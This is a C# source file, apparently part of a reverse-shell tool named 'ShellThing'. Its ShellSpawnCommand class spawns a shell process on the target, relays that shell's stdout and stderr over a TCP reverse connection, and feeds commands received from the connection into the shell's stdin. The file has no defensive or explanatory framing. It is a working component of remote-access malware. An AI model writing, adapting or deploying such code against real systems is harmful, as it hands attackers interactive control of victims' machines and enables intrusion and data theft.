using System;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    class ShellSpawnCommand : ICommand
    {
        private string shellType;

        TcpReverseConnection connection;
     
        public ShellSpawnCommand(string shellType)
        {
            this.shellType = shellType;
        }

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

            ShellSubProcess shell = new ShellSubProcess(shellType);
            SubProcessIoManager processIoManager = new SubProcessIoManager(shell.Process, connection);

            // Subscribe to events for stdout and stderr being read from target process
            processIoManager.StdoutTextRead += new StringReadEventHandler(OnStdOutRead);
            processIoManager.StderrTextRead += new StringReadEventHandler(OnStdErrRead);

            shell.StartProcess();
            processIoManager.StartProcessOutputRead();

            // continuously write from connection.ReceiveData() to stdin of target process
            while (shell.Process.HasExited == false)
            {
                processIoManager.WriteStdIn();
            }         
        }

        private void OnStdOutRead(string text)
        {
            connection.SendData(text);
        }

        private void OnStdErrRead(string text)
        {
            connection.SendData(text);
        }
    }
}
